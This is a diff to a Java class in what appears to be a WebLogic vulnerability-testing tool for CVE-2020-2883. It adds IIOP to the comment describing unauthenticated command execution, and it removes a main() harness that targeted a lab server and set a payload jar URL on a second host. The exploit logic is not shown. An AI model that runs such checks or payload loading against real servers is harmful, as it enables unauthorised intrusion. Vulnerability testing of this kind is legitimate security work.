@@ -30,7 +30,7 @@ import static com.weblogic.framework.utils.VersionUtils.getVersion;
  * Desc:
  * <p>
  *     CVE-2020-2883
- *     Oracle Fusion中间件 Oracle Coherence 存在缺陷，攻击者可利用该漏洞在未经授权下通过构造T3协议请求，获取 Weblogic服务器权限，执行任意命令。
+ *     Oracle Fusion 中间件 Oracle Coherence 存在缺陷，攻击者可利用该漏洞在未经授权下通过构造 T3、IIOP 协议请求，获取 Weblogic服务器权限，执行任意命令。
  *     该漏洞主要为 CVE-2020-2555 基于 CommonsCollections2 （ExtractorComparator + PriorityQueue） 的绕过。
  *     漏洞影响版本:
  *     Oracle Coherence 3.7.1.17
@@ -97,13 +97,5 @@ public class CVE_2020_2883 implements VulTest {
     }
 
     public static void main(String[] args) throws Exception {
-        String url = "http://192.168.1.3:7001/";
-        String javascriptUrl = "http://192.168.1.6:9999/com.bea.javascript.jar";
-        VulCheckParam vulCheckParam = new VulCheckParam();
-        vulCheckParam.setJavascriptUrl(javascriptUrl);
-        vulCheckParam.setVersion(getVersion("192.168.1.3", 7001));
-        vulCheckParam.setProtocol("t3");
-        CVE_2020_2883 cve_2020_2883 = new CVE_2020_2883();
-        System.out.println(cve_2020_2883.vulnerable(url,vulCheckParam));
     }
 }
